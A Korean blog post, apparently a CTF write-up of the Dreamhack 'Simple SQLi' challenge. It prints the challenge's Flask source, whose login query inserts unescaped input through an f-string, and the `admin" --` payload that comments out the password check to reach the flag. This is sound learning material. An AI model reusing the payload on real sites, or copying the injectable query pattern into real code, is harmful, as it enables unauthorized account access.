---
title: "[CTF] 드림핵 Simple SQLi"
date: 2025-09-18 21:00:00 +0900
categories: [CTF, Web]
tags: [CTF, SQLi]
description: "드림핵 Simple SQLi"
author: "송지민"
toc: true
---

## 문제 개요 (간단히)
이번 문제는 로그인 기능이 있는 간단한 웹앱으로, 입력값을 그대로 SQL 쿼리에 삽입하는 구조였다. 딱 봐도 기본적인 SQL 인젝션(SQLi)이 가능해 보였다.

- `/login` : POST로 받은 `userid`, `userpassword`를 이용해 다음과 같은 쿼리를 수행한다.  
  ```sql
  select * from users where userid="{userid}" and userpassword="{userpassword}"
  ```
- 쿼리 결과에서 `userid == 'admin'`이면 FLAG를 반환한다.

아래는 문제에서 제공된 **원본 소스코드 전체**다.

```python
#!/usr/bin/python3
from flask import Flask, request, render_template, g
import sqlite3
import os
import binascii

app = Flask(__name__)
app.secret_key = os.urandom(32)

try:
    FLAG = open('./flag.txt', 'r').read()
except:
    FLAG = '[**FLAG**]'

DATABASE = "database.db"
if os.path.exists(DATABASE) == False:
    db = sqlite3.connect(DATABASE)
    db.execute('create table users(userid char(100), userpassword char(100));')
    db.execute(f'insert into users(userid, userpassword) values ("guest", "guest"), ("admin", "{binascii.hexlify(os.urandom(16)).decode("utf8")}");')
    db.commit()
    db.close()

def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = sqlite3.connect(DATABASE)
    db.row_factory = sqlite3.Row
    return db

def query_db(query, one=True):
    cur = get_db().execute(query)
    rv = cur.fetchall()
    cur.close()
    return (rv[0] if rv else None) if one else rv

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None:
        db.close()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    else:
        userid = request.form.get('userid')
        userpassword = request.form.get('userpassword')
        res = query_db(f'select * from users where userid="{userid}" and userpassword="{userpassword}"')
        if res:
            userid = res[0]
            if userid == 'admin':
                return f'hello {userid} flag is {FLAG}'
            return f'<script>alert("hello {userid}");history.go(-1);</script>'
        return '<script>alert("wrong");history.go(-1);</script>'

app.run(host='0.0.0.0', port=8000)
```

---

## 내가 실제로 푼 방법 (풀이 기록 — 블로그용 서술 방식)
소스코드를 확인하자마자 SQL 인젝션 포인트가 뻔히 보였다.

```sql
select * from users where userid="{userid}" and userpassword="{userpassword}"
```

조건에서 `userid == 'admin'`일 때 FLAG를 주기 때문에, admin 계정이 존재함을 알 수 있다. 그렇다면 `userid` 입력에 `"--`를 사용해 뒤를 주석 처리하면 쉽게 우회할 수 있다.

### 내가 사용한 입력값
- `userid`:  
  ```
  admin" --
  ```
- `userpassword`:  
  ```
  아무거나
  ```

### 최종 실행된 쿼리
```sql
select * from users where userid="admin" -- " and userpassword="아무거나"
```

이 구문은 뒤가 주석 처리되면서 단순히:
```sql
select * from users where userid="admin"
```
으로 축약된다.

결과적으로 admin 사용자의 데이터가 반환되고, FLAG를 획득할 수 있었다.

---

## 재현 흐름 (짧게)
1. 공격자: `/login`에서 userid에 `admin" --`, pw에 아무 값 입력  
2. 서버: 최종 쿼리는 `select * from users where userid="admin"`  
3. 쿼리 결과 admin 계정 반환  
4. 조건문 `if userid == 'admin'` → FLAG 출력  
5. 공격자: FLAG 확인 성공

---

## 왜 이게 가능했나 (한 줄)
입력값을 이스케이프 없이 그대로 SQL 문자열에 삽입하여 기본적인 SQLi가 발생했기 때문이다.

---

## 마무리(짧게)
simple_sqli 문제는 정말 기본적인 SQL 인젝션 예제였다. 가장 전형적인 `"--` 주석 처리 기법으로 admin 계정에 접근해 FLAG를 획득했다.
